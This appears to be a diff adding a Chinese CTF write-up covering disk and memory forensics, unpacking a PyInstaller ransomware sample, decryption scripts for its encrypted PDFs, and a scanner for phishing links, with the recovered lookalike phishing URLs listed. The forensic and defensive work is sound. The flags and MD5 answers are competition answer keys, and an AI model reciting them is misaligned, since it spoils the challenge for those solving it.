+        &quot;-o&quot;,
+        &quot;--output&quot;,
+        default=&quot;&quot;,
+        help=&quot;Output XLSX path. Default: &amp;lt;input_basename&amp;gt;_decoded.xlsx&quot;)
+    ap.add_argument(&quot;--csv-encoding&quot;,
+                    default=&quot;utf-8&quot;,
+                    help=&quot;CSV file encoding. Default: utf-8&quot;)
+    ap.add_argument(&quot;--text-encoding&quot;,
+                    default=&quot;utf-8&quot;,
+                    help=&quot;Decoded text encoding. Default: utf-8&quot;)
+    ap.add_argument(&quot;--sheet-name&quot;,
+                    default=&quot;decoded&quot;,
+                    help=&quot;Excel sheet name. Default: decoded&quot;)
+    args = ap.parse_args()
+
+    if not os.path.exists(args.input):
+        raise SystemExit(f&quot;Input file not found: {args.input}&quot;)
+
+    if not args.output:
+        base = os.path.splitext(os.path.basename(args.input))[0]
+        args.output = f&quot;{base}_decoded.xlsx&quot;
+
+    # Read everything as string to avoid losing leading zeros etc.
+    df = pd.read_csv(
+        args.input,
+        dtype=str,
+        keep_default_na=False,
+        encoding=args.csv_encoding,
+    )
+
+    # Decode every cell.
+    decoded_df = df.applymap(
+        lambda v: _try_b64_decode_cell(v, args.text_encoding))
+
+    # Export to XLSX.
+    with pd.ExcelWriter(args.output, engine=&quot;openpyxl&quot;) as writer:
+        decoded_df.to_excel(writer, index=False, sheet_name=args.sheet_name)
+
+    print(f&quot;OK: wrote {args.output}&quot;)
+    return 0
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目3:&lt;/h4&gt;
+&lt;p&gt;在得到居民信息之后，领导让你统计一下居民信息中重名的数量，方便后续的工作开展。你需要统计出现重名次数出现最多的人的姓名以及出现的次数，例：重名最多的人叫张三，出现了10次，则最终提交的答案为：张三10。&lt;/p&gt;
+&lt;p&gt;将解码后的表格对应的姓名列通过CyberChef排序查重即可。&lt;code&gt;刘红梅7&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;数据应急&lt;/h3&gt;
+&lt;h4&gt;题目1:&lt;/h4&gt;
+&lt;p&gt;黑客在攻击时，为了对公司造成更大的破坏，直接删除了磁盘中的文件。但好在系统有自动的磁盘备份计划，保留了一个备份磁盘。请你通过技术手段，恢复出黑客删除的文件。请找出删除的文件中的一个合同文件，提交合同编号。如果合同编号为HT-2023-003085，则最终提交答案为:HT-2023-003085。&lt;/p&gt;
+&lt;p&gt;判断镜像的分区/文件系统类型，确认是否需要偏移（offset），列出文件系统目录项，确认是否存在已删除文件，使用恢复工具将删除文件导出，在恢复出的文件中定位合同文件，并提取合同编号。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;识别磁盘镜像文件系统类型，镜像为 DOS/MBR + FAT16 文件系统，&lt;code&gt;Sectors before file system: 0&lt;/code&gt;说明文件系统从 0 扇区开始，无需分区偏移，&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;$ file disk.img                      
+disk.img: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID &quot;mkfs.fat&quot;, sectors/cluster 32, reserved sectors 32, root entries 512, Media descriptor 0xf8, sectors/FAT 256, sectors/track 63, heads 64, sectors 2097144 (volumes &amp;gt; 32 MB), serial number 0xdd894a27, unlabeled, FAT (16 bit)
+
+$ fsstat disk.img                                           
+FILE SYSTEM INFORMATION
+--------------------------------------------
+File System Type: FAT16
+
+OEM Name: mkfs.fat
+Volume ID: 0xdd894a27
+Volume Label (Boot Sector): NO NAME    
+Volume Label (Root Directory):
+File System Type Label: FAT16   
+
+Sectors before file system: 0
+
+File System Layout (in sectors)
+Total Range: 0 - 2097143
+* Reserved: 0 - 31
+** Boot Sector: 0
+* FAT 0: 32 - 287
+* FAT 1: 288 - 543
+* Data Area: 544 - 2097143
+** Root Directory: 544 - 575
+** Cluster Area: 576 - 2097119
+** Non-clustered: 2097120 - 2097143
+
+METADATA INFORMATION
+--------------------------------------------
+Range: 2 - 33545606
+Root Directory: 2
+
+CONTENT INFORMATION
+--------------------------------------------
+Sector Size: 512
+Cluster Size: 16384
+Total Cluster Range: 2 - 65518
+
+FAT CONTENTS (in sectors)
+--------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;列出目录项并确认删除文件，&lt;code&gt;*&lt;/code&gt;表示该条目已被删除，但元数据仍可见，属于可恢复对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;$ fls disk.img               
+r/r * 5:        WIN-SERVER.zip
+r/r * 7:        商业合作合同.pdf
+r/r * 9:        data
+v/v 33545603:   $MBR
+v/v 33545604:   $FAT1
+v/v 33545605:   $FAT2     
+V/V 33545606:   $OrphanFiles
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;恢复删除文件，取出合同编号&lt;code&gt;HT-2025-001234&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;$ mkdir -p recovered
+$ tsk_recover -e disk.img recovered/
+Files Recovered: 4
+
+$ ls recovered 
+&apos;$OrphanFiles&apos;   data   WIN-SERVER.zip   商业合作合同.pdf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目2:&lt;/h4&gt;
+&lt;p&gt;你通过技术手段恢复出黑客删除的文件后，发现存在加密文件，但是管理员忘记了密钥，但经验丰富的你知道可以绕开验证直接读取加密文件中的内容。请你通过技术手段，读取加密内容。请读取加密文件中的密码本，提交密码本中的内容，如果密码本中的内容为flag{xxxxxxx}，则提交答案为xxxxxxx。&lt;/p&gt;
+&lt;p&gt;解压&lt;code&gt;WIN-SERVER.zip&lt;/code&gt;得到&lt;code&gt;WIN-SERVER-PC-20251202-122722.raw&lt;/code&gt;文件，&lt;code&gt;.raw&lt;/code&gt;文件一般是内存镜像，通过&lt;code&gt;Volatility3&lt;/code&gt;确定为 Windows 内存镜像，生成&lt;code&gt;strings&lt;/code&gt;文件，使用 Volatility3 过滤并检索 flag。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ vol -f WIN-SERVER-PC-20251202-122722.raw windows.info
+Volatility 3 Framework 2.26.2
+Progress:  100.00               PDB scanning finished                        
+Variable        Value
+
+Kernel Base     0xf80003e07000
+DTB     0x187000
+Symbols file:///home/kali/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/F8E2A8B5C9B74BF4A6E4A48F18009994-2.json.xz
+Is64Bit True
+IsPAE   False
+layer_name      0 WindowsIntel32e
+memory_layer    1 FileLayer
+KdDebuggerDataBlock     0xf80003ff0070
+NTBuildLab      7600.16385.amd64fre.win7_rtm.090
+CSDVersion      0
+KdVersionBlock  0xf80003ff0030
+Major/Minor     15.7600
+MachineType     34404
+KeNumberProcessors      2
+SystemTime      2025-12-02 12:27:23+00:00
+NtSystemRoot    C:\Windows
+NtProductType   NtProductWinNt
+NtMajorVersion  6
+NtMinorVersion  1
+PE MajorOperatingSystemVersion  6
+PE MinorOperatingSystemVersion  1
+PE Machine      34404
+PE TimeDateStamp        Mon Jul 13 23:40:48 2009
+
+$ strings -a -td WIN-SERVER-PC-20251202-122722.raw &amp;gt; mem.strings 
+$ strings -a -td -el WIN-SERVER-PC-20251202-122722.raw &amp;gt; mem.strings.utf16
+# -a 全文件扫描
+# -td 输出十进制偏移
+# -el 提取 UTF-16LE 字符串
+
+$ vol -f WIN-SERVER-PC-20251202-122722.raw windows.strings --strings-file mem.strings | rg -n &quot;flag\{&quot; | head -n 50
+1390763:_V@YAXPEAX@Zflag{33c3789a36bb61beb6d4268cd7d13038} 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据分析&lt;/h3&gt;
+&lt;h4&gt;题目1：&lt;/h4&gt;
+&lt;p&gt;密钥取证。安全团队提取到疑似勒索程序（exe文件），该程序采用“混合加密机制”对PDF文档进行加密：使用RSA公钥加密AES密钥（用于安全存储/传输AES密钥）；使用原始的AES密钥（明文）直接加密PDF文档。若要恢复文档，必须从勒索程序中获取攻击遗留的RSA私钥。请你分析勒索程序，找到私钥，并将私钥中“-----BEGIN PRIVATE KEY -----”之后的32位字符当作答案提交。&lt;/p&gt;
+&lt;p&gt;检查&lt;code&gt;en.exe&lt;/code&gt;文件发现是Windows PE 可执行程序，通过&lt;code&gt;string&lt;/code&gt;查找特征字符，发现python相关，可能为&lt;code&gt;PyInstaller&lt;/code&gt;打包的Python程序，通过&lt;code&gt;pyinstxtractor&lt;/code&gt;工具解包找到私钥，使用CyberChef取出32位即可。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ file en.exe store.key
+en.exe:    PE32+ executable for MS Windows 6.00 (console), x86-64, 7 sections
+store.key: OpenPGP Public Key
+
+$ strings en.exe | rg -i python
+pyi-python-flag
+%s\python%d.%d\lib-dynload
+Failed to set python home path: %s
+Failed to pre-initialize embedded python interpreter!
+Failed to set python home path!
+Failed to allocate PyConfig structure! Unsupported python version?
+Failed to start embedded python interpreter: %s
+Failed to start embedded python interpreter!
+bpython3.dll
+bpython310.dll
+6python310.dll
+
+$ curl -L -O https://github.com/extremecoders-re/pyinstxtractor/blob/master/pyinstxtractor.py
+$ python ~/020-tools/pyinstxtractor.py en.exe
+
+$ rg -i &quot;BEGIN PRIVATE KEY&quot; ./en.exe_extracted
+./en.exe_extracted/key/pr.pem
+
+$ cat ./en.exe_extracted/key/pr.pem 
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCt4TrETrlzU4NV
+083rqT3XUun3NnxgPVVioX8tJZUH9rjs0bdTPTMk877seCIsJ98yj2VAhmGbviZ7
+Mv+j+XnYCavDwew/oXnB9mWsvb1wRUzVhwsAfKz6gneGDthD6vRA+je4KBM+HFWH
+.......
+-----END PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目2:&lt;/h4&gt;
+&lt;p&gt;数据解密。在成功获得攻击者的RSA私钥后，可解密AES密钥，并进一步解密被勒索的PDF文件。请使用正确的私钥恢复文件内容。请计算“0999_内部文件0999.pdf”解密后，文件的MD5值，并提交其32位小写MD5作为答案。&lt;/p&gt;
+&lt;p&gt;通过解包出的&lt;code&gt;en.exe_extracted&lt;/code&gt;发现&lt;code&gt;encrypt_files.pyc&lt;/code&gt;文件可分析加密逻辑：&lt;code&gt;store.key&lt;/code&gt;里保存的是RSA公钥加密后的&lt;code&gt;AES-256&lt;/code&gt;密钥，且为&lt;code&gt;OAEP+SHA256&lt;/code&gt;，文件内容用&lt;code&gt;AES-256-ECB + PKCS7 &lt;/code&gt;填充加密，用上题拿到的RSA 私钥解出&lt;code&gt;AES key&lt;/code&gt;，再解密目标PDF，最后算MD5（32 位小写）即可。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ trings -a encrypt_files.pyc | rg &quot;token_bytes|urandom|get_random_bytes|AES-256|AES&quot;
+AES-256-ECB
+token_bytesr
+        aes_key: AES
+AES-256-ECB
+        aes_key: AES
+AESr
+AES-256
+ (AES-256-ECB)
+
+ $ ls -alh store.key        
+-rw-r--r-- 1 kali kali 256 Dec  5 06:29 store.key
+
+$ strings -a encrypt_files.pyc | rg  &quot;OAEP|MGF1|SHA256|SHA1|PKCS1&quot;
+OAEP
+MGF1r
+SHA256r$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过python通用脚本解答&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import base64
+import hashlib
+import sys
+from pathlib import Path
+
+from cryptography.hazmat.primitives import hashes, padding as sym_padding, serialization
+from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+
+def read_maybe_b64(path: Path) -&amp;gt; bytes:
+    &quot;&quot;&quot;
+    Read file; if it looks like base64 text, decode it, else return raw bytes.
+    &quot;&quot;&quot;
+    raw = path.read_bytes()
+    # quick heuristic: mostly printable and base64 alphabet
+    try:
+        s = raw.decode(&quot;ascii&quot;)
+        cleaned = &quot;&quot;.join(s.split())
+        if cleaned and all(c.isalnum() or c in &quot;+/=_-&quot; for c in cleaned):
+            # add padding
+            pad = (-len(cleaned)) % 4
+            cleaned += &quot;=&quot; * pad
+            # urlsafe first, then standard
+            try:
+                return base64.urlsafe_b64decode(cleaned.encode())
+            except Exception:
+                return base64.b64decode(cleaned.encode())
+    except Exception:
+        pass
+    return raw
+
+
+def load_private_key(key_bytes: bytes, password: bytes | None = None):
+    &quot;&quot;&quot;
+    Accept PEM, DER, or raw base64(der).
+    &quot;&quot;&quot;
+    # PEM
+    if b&quot;BEGIN&quot; in key_bytes and b&quot;PRIVATE KEY&quot; in key_bytes:
+        return serialization.load_pem_private_key(key_bytes, password=password)
+
+    # maybe base64(der)
+    try:
+        s = key_bytes.decode(&quot;ascii&quot;)
+        cleaned = &quot;&quot;.join(s.split())
+        if cleaned and all(c.isalnum() or c in &quot;+/=_-&quot; for c in cleaned):
+            pad = (-len(cleaned)) % 4
+            cleaned += &quot;=&quot; * pad
+            der = base64.b64decode(cleaned.encode(), validate=False)
+            return serialization.load_der_private_key(der, password=password)
+    except Exception:
+        pass
+
+    # DER
+    return serialization.load_der_private_key(key_bytes, password=password)
+
+
+def rsa_decrypt_aes_key(privkey, enc_key: bytes) -&amp;gt; bytes:
+    &quot;&quot;&quot;
+    OAEP(SHA256) RSA decrypt.
+    &quot;&quot;&quot;
+    return privkey.decrypt(
+        enc_key,
+        asym_padding.OAEP(
+            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None,
+        ),
+    )
+
+
+def aes_ecb_pkcs7_decrypt(aes_key: bytes, ciphertext: bytes) -&amp;gt; bytes:
+    if len(aes_key) not in (16, 24, 32):
+        raise ValueError(f&quot;Unexpected AES key length: {len(aes_key)} bytes&quot;)
+    cipher = Cipher(algorithms.AES(aes_key), modes.ECB())
+    dec = cipher.decryptor()
+    padded = dec.update(ciphertext) + dec.finalize()
+
+    unpadder = sym_padding.PKCS7(128).unpadder()
+    plaintext = unpadder.update(padded) + unpadder.finalize()
+    return plaintext
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;CTF ransomware decrypt: RSA(OAEP-SHA256) -&amp;gt; AES-ECB(PKCS7) -&amp;gt; MD5&quot;)
+    ap.add_argument(&quot;--privkey&quot;, required=True, help=&quot;RSA private key file (PEM/DER/Base64)&quot;)
+    ap.add_argument(&quot;--keyfile&quot;, required=True, help=&quot;Encrypted AES key file (e.g. store.key)&quot;)
+    ap.add_argument(&quot;--infile&quot;, required=True, help=&quot;Encrypted PDF file path (likely *.pdf.enc)&quot;)
+    ap.add_argument(&quot;--out&quot;, default=&quot;decrypted.pdf&quot;, help=&quot;Output decrypted PDF path&quot;)
+    ap.add_argument(&quot;--password&quot;, default=None, help=&quot;Private key password (if any)&quot;)
+    args = ap.parse_args()
+
+    priv_bytes = Path(args.privkey).read_bytes()
+    pwd = args.password.encode() if args.password else None
+    priv = load_private_key(priv_bytes, password=pwd)
+
+    enc_key = read_maybe_b64(Path(args.keyfile))
+    aes_key = rsa_decrypt_aes_key(priv, enc_key)
+
+    ct = Path(args.infile).read_bytes()
+    pt = aes_ecb_pkcs7_decrypt(aes_key, ct)
+
+    Path(args.out).write_bytes(pt)
+
+    md5 = hashlib.md5(pt).hexdigest()
+    print(md5)  # 32位小写MD5
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装依赖执行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ echo &apos;cryptography&amp;gt;=41.0.0&apos; &amp;gt; requirements.txt
+$ python -m pip install -r requirments.txt
+$ python decrypt_pdf.py --privkey ./en.exe_extracted/key/pr.pem --keyfile store.key --infile ./pdfs/0999_内部文档0999.pdf.enc --out ./0999.pdf
+52fd2cb4fc43eceb3c79233038bb5f42
+
+$ ls  
+0999.pdf  decrypt_pdf.py  en.exe  en.exe_extracted  enpdf.zip  __MACOSX  pdfs  requirments.txt  store.key  题目说明文档.pdf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目3:&lt;/h4&gt;
+&lt;p&gt;钓鱼链接。在时间调查中，安全团队统计出共计999份PDF文档，其中部分文档包含内部链接。为避免安全风险，需要对所有文档进行链接审查。PDF中的URL可能以以下的形式出现：1.文本中直接显示的URL；2.隐藏在PDF Annotation超链接内的URL（显示内容与真实跳转地址可能不同）；3.URL参数中的跳转地址，某些URL可能包含在redirect、next、url等参数，参数值指向实际跳转的目标地址，即使URL本身的主域名为合法域名，参数中的跳转地址也需要单独检查。公司合法域名范围为：veritytech.com及所有子域名（*.veritytech.com）。请分析999份PDF，找出所有指向&lt;code&gt;veritytech.com&lt;/code&gt;域名的URL（包括文本显示，Annotation跳转URL，以及URL参数中的跳转地址），提取其完整URL，按字典升序排序后，用英文半角逗号拼接，最终对拼接字符串计算32位小写作为答案。注意：对于包含跳参数的URL（如&lt;code&gt;http://mail.veritytech.com/auth?next=https://evil.com&lt;/code&gt;)，如果URL本身的主域名为合法域名，则不应该提取完整URL；但需要提取参数中的跳转地址（如&lt;code&gt;https://evil.com&lt;/code&gt;）进行判断。提取是需要判断每个URL的主域名，仅提取主域名为非&lt;code&gt;veritytech.com&lt;/code&gt;及其子域名的URL。&lt;/p&gt;
+&lt;p&gt;通过脚本解还原所有pdf到pdfs_dec目录。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import base64
+import hashlib
+from pathlib import Path
+from urllib.parse import unquote
+
+from cryptography.hazmat.primitives import hashes, padding as sym_padding, serialization
+from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+
+def read_maybe_b64(path: Path) -&amp;gt; bytes:
+    raw = path.read_bytes()
+    try:
+        s = raw.decode(&quot;ascii&quot;)
+        cleaned = &quot;&quot;.join(s.split())
+        if cleaned and all(c.isalnum() or c in &quot;+/=_-&quot; for c in cleaned):
+            pad = (-len(cleaned)) % 4
+            cleaned += &quot;=&quot; * pad
+            try:
+                return base64.urlsafe_b64decode(cleaned.encode())
+            except Exception:
+                return base64.b64decode(cleaned.encode())
+    except Exception:
+        pass
+    return raw
+
+
+def load_private_key(key_path: Path, password: str | None):
+    kb = key_path.read_bytes()
+    pwd = password.encode() if password else None
+
+    if b&quot;BEGIN&quot; in kb and b&quot;PRIVATE KEY&quot; in kb:
+        return serialization.load_pem_private_key(kb, password=pwd)
+
+    # maybe base64 DER
+    try:
+        s = kb.decode(&quot;ascii&quot;)
+        cleaned = &quot;&quot;.join(s.split())
+        pad = (-len(cleaned)) % 4
+        der = base64.b64decode((cleaned + &quot;=&quot; * pad).encode(), validate=False)
+        return serialization.load_der_private_key(der, password=pwd)
+    except Exception:
+        return serialization.load_der_private_key(kb, password=pwd)
+
+
+def rsa_decrypt_key(priv, enc_key: bytes) -&amp;gt; bytes:
+    # 默认：OAEP-SHA256
+    return priv.decrypt(
+        enc_key,
+        asym_padding.OAEP(
+            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None,
+        ),
+    )
+
+
+def aes_ecb_pkcs7_decrypt(aes_key: bytes, ciphertext: bytes) -&amp;gt; bytes:
+    cipher = Cipher(algorithms.AES(aes_key), modes.ECB())
+    dec = cipher.decryptor()
+    padded = dec.update(ciphertext) + dec.finalize()
+
+    unpadder = sym_padding.PKCS7(128).unpadder()
+    return unpadder.update(padded) + unpadder.finalize()
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;Batch decrypt *.pdf.enc -&amp;gt; *.pdf using RSA-&amp;gt;AES key unwrap&quot;)
+    ap.add_argument(&quot;--privkey&quot;, required=True, help=&quot;RSA private key file (PEM/DER/Base64)&quot;)
+    ap.add_argument(&quot;--keyfile&quot;, required=True, help=&quot;Encrypted AES key file (store.key)&quot;)
+    ap.add_argument(&quot;--indir&quot;, required=True, help=&quot;Directory containing *.pdf.enc&quot;)
+    ap.add_argument(&quot;--outdir&quot;, required=True, help=&quot;Output directory for decrypted PDFs&quot;)
+    ap.add_argument(&quot;--password&quot;, default=None, help=&quot;Private key password (if any)&quot;)
+    args = ap.parse_args()
+
+    indir = Path(args.indir)
+    outdir = Path(args.outdir)
+    outdir.mkdir(parents=True, exist_ok=True)
+
+    priv = load_private_key(Path(args.privkey), args.password)
+    enc_key = read_maybe_b64(Path(args.keyfile))
+    aes_key = rsa_decrypt_key(priv, enc_key)
+
+    if len(aes_key) not in (16, 24, 32):
+        raise SystemExit(f&quot;[!] Unexpected AES key length: {len(aes_key)} bytes&quot;)
+
+    files = sorted(indir.glob(&quot;*.pdf.enc&quot;))
+    if not files:
+        raise SystemExit(&quot;[!] No *.pdf.enc found in indir&quot;)
+
+    ok = 0
+    for f in files:
+        ct = f.read_bytes()
+        pt = aes_ecb_pkcs7_decrypt(aes_key, ct)
+
+        out_name = f.name[:-4]  # remove &quot;.enc&quot;
+        out_path = outdir / out_name
+        out_path.write_bytes(pt)
+        ok += 1
+
+    print(f&quot;[+] Decrypted {ok} files into: {outdir}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过脚本提取URL拼接&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import re
+import hashlib
+from pathlib import Path
+from urllib.parse import urlparse, parse_qs, unquote
+
+from pypdf import PdfReader
+
+URL_PATTERN = re.compile(
+    r&apos;https?://[^\s&amp;lt;&amp;gt;&quot;{}|\\^\[\]`\x00-\x1f]+&apos;,
+    re.IGNORECASE
+)
+
+REDIRECT_PARAMS = {
+    &apos;redirect&apos;, &apos;next&apos;, &apos;url&apos;, &apos;target&apos;, &apos;goto&apos;, &apos;return&apos;,
+    &apos;returnurl&apos;, &apos;return_url&apos;, &apos;redirect_uri&apos;, &apos;continue&apos;,
+    &apos;dest&apos;, &apos;destination&apos;, &apos;redir&apos;, &apos;link&apos;, &apos;out&apos;, &apos;to&apos;,
+    &apos;redirect_url&apos;, &apos;redirect_to&apos;, &apos;open&apos;
+}
+
+WHITELIST_ROOT = &quot;veritytech.com&quot;
+
+# RFC3986 allowed characters (very safe truncation rule)
+ALLOWED_URL_CHARS = set(
+    &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;
+    &quot;-._~:/?#[]@!$&amp;amp;&apos;()*+,;=%&quot;
+)
+
+def sanitize_url(u: str) -&amp;gt; str:
+    &quot;&quot;&quot;
+    关键：把“URL后面紧跟中文括号/中文标点/说明文字”的部分截断掉，
+    避免 urlparse(netloc) 被污染导致白名单判断失效。
+    &quot;&quot;&quot;
+    u = u.strip().replace(&quot;\\&quot;, &quot;&quot;)
+
+    # 截断：遇到非 RFC3986 合法字符就停止（例如：中文括号 ）中文分号 ；中文逗号 ，等）
+    out = []
+    for ch in u:
+        if ch in ALLOWED_URL_CHARS:
+            out.append(ch)
+        else:
+            break
+    u2 = &quot;&quot;.join(out)
+
+    # 再做最小尾部标点清理（英文标点）
+    u2 = u2.rstrip(&apos;.,;:!?)\&apos;&quot;&apos;)
+    return u2
+
+def get_domain(url: str) -&amp;gt; str:
+    try:
+        parsed = urlparse(url)
+        domain = (parsed.netloc or &quot;&quot;).lower()
+        if &quot;:&quot; in domain:
+            domain = domain.split(&quot;:&quot;, 1)[0]
+        return domain.strip(&quot;.&quot;)
+    except Exception:
+        return &quot;&quot;
+
+def is_veritytech_domain(domain: str) -&amp;gt; bool:
+    if not domain:
+        return True
+    domain = domain.lower().strip(&quot;.&quot;)
+    return domain == WHITELIST_ROOT or domain.endswith(&quot;.&quot; + WHITELIST_ROOT)
+
+def extract_urls_from_raw_pdf(pdf_path: Path) -&amp;gt; set[str]:
+    urls = set()
+    try:
+        data = pdf_path.read_bytes()
+        text = data.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;)
+        for u in URL_PATTERN.findall(text):
+            u2 = sanitize_url(u)
+            if u2:
+                urls.add(u2)
+    except Exception:
+        pass
+    return urls
+
+def extract_urls_from_annotations(pdf_path: Path) -&amp;gt; set[str]:
+    urls = set()
+    try:
+        reader = PdfReader(str(pdf_path))
+        for page in reader.pages:
+            annots = page.get(&quot;/Annots&quot;)
+            if not annots:
+                continue
+            for a in annots:
+                try:
+                    obj = a.get_object()
+                    action = obj.get(&quot;/A&quot;)
+                    if not action:
+                        continue
+                    uri = action.get(&quot;/URI&quot;)
+                    if uri:
+                        u2 = sanitize_url(str(uri))
+                        if u2:
+                            urls.add(u2)
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return urls
+
+def extract_redirect_urls(url: str) -&amp;gt; list[str]:
+    out = []
+    try:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+
+        for k, vals in params.items():
+            if (k or &quot;&quot;).lower() not in REDIRECT_PARAMS:
+                continue
+            for v in vals:
+                if not v:
+                    continue
+
+                decoded = v
+                for _ in range(5):
+                    try:
+                        new_decoded = unquote(decoded)
+                        if new_decoded == decoded:
+                            break
+                        decoded = new_decoded
+                    except Exception:
+                        break
+
+                decoded = decoded.strip()
+                if decoded.startswith(&quot;http://&quot;) or decoded.startswith(&quot;https://&quot;):
+                    u2 = sanitize_url(decoded)
+                    if u2:
+                        out.append(u2)
+    except Exception:
+        pass
+    return out
+
+def main():
+    pdf_dir = Path(&quot;pdfs_dec&quot;)
+    pdf_files = sorted(pdf_dir.glob(&quot;*.pdf&quot;))
+    if not pdf_files:
+        print(&quot;[!] No PDFs found in decrypted_pdfs&quot;)
+        return
+
+    all_urls = set()
+    for pdf in pdf_files:
+        all_urls |= extract_urls_from_raw_pdf(pdf)
+        all_urls |= extract_urls_from_annotations(pdf)
+
+    print(f&quot;[+] 提取到 URL 总数（含白名单与外链）: {len(all_urls)}&quot;)
+
+    malicious = set()
+    for u in all_urls:
+        if not u.lower().startswith(&quot;https://&quot;):
+            continue
+
+        dom = get_domain(u)
+
+        # 主 URL 非白名单 =&amp;gt; 计入
+        if dom and (not is_veritytech_domain(dom)):
+            malicious.add(u)
+
+        # URL 参数里的跳转目标：只加入非白名单的目标
+        for ru in extract_redirect_urls(u):
+            if not ru.lower().startswith(&quot;https://&quot;):
+                continue
+            rdom = get_domain(ru)
+            if rdom and (not is_veritytech_domain(rdom)):
+                malicious.add(ru)
+
+    sorted_urls = sorted(malicious)
+    print(f&quot;[+] 有效恶意 URL 数量: {len(sorted_urls)}&quot;)
+    for x in sorted_urls:
+        print(x)
+
+    joined = &quot;,&quot;.join(sorted_urls)
+    md5 = hashlib.md5(joined.encode(&quot;utf-8&quot;)).hexdigest()
+    print(&quot;\n[+] 拼接字符串 MD5(32位小写):&quot;)
+    print(md5)
+
+    Path(&quot;malicious_urls_sorted.txt&quot;).write_text(&quot;\n&quot;.join(sorted_urls), encoding=&quot;utf-8&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;提取结果发现有两个不符合要求（2和3），手动排查后，通过CyberChef按照要求拼接取md5即可。&lt;code&gt;0a16f1ca5e8db1270074d0d39f6edeaf&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://account-checker.xyz/login
+https://git.veritytech.internal/platform/charts
+https://gitlab.veritytech.internal/platform/charts
+https://security-review.veritytech-support.info/validate
+https://ver1tytech.com/reset
+https://verify-account.veritytech-portal.xyz/auth
+https://verify-id.top/session
+https://verify-veritytech.top/auth
+https://veritytech-login-security.net/update
+https://veritytech-security-check.xyz/verify
+https://veritytech-support-alert.co/update
+https://veritytech-update-alert.co/notice
+https://veritytech.com.io/login
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据审计&lt;/h3&gt;
+&lt;h4&gt;题目1:&lt;/h4&gt;
+&lt;p&gt;证书合成。请根据题目提供的证书关键参数，合成私钥解密证书。请选手找到id为285的参数合成的证书（参考附件：params.csv）可以解密哪个流量包（参考附件：pcap.zip）。并将其流量包名称作为答案提交。若id为285的参数合成证书，可以解密“UT5NHVWo2Z.pacp”，则答案提交为UT5NHVWo2Z.pacp的32位小写MD5值如7cb41b100d1cfbcbdldeld795dac3fcb。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;params.csv&lt;/code&gt;文件给了多行RSA私钥的关键参数（p、q、e），&lt;code&gt;pcap.zip&lt;/code&gt;文件中有很多抓包，每个抓包里都有&lt;code&gt;TLS&lt;/code&gt; 握手的服务器证书。某个抓包里的服务器证书公钥（n,e）与重建私钥对应的公钥一致，那这个私钥就能用于该抓包的&lt;code&gt;TLS&lt;/code&gt;解密（证书/私钥匹配），所以不一定要把&lt;code&gt;TLS&lt;/code&gt;流量解密出来,只要匹配证书公钥就能确定对应哪个流量包。&lt;/p&gt;
